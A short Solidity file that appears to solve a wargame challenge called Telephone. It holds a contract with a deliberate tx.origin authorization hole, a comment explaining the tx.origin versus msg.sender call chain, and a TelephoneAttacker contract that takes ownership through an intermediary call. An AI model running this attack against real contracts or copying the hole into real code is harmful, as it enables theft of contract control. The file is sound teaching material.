// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* Стань владельцем контракта */
contract Telephone {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

/* -------------------- Hack -------------------- */
/* 
    Description.

    Let A - Signer, B - Attacker, and C - Telephone Contract.
    Then imagine this call chain: A -> B -> C.
    In C
    tx.origin is A - the person who signed transaction. 
    msg.sender is B.
*/

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    function attack(address telephoneAddr, address _newOwner) public {
        ITelephone(telephoneAddr).changeOwner(_newOwner);
    }
}
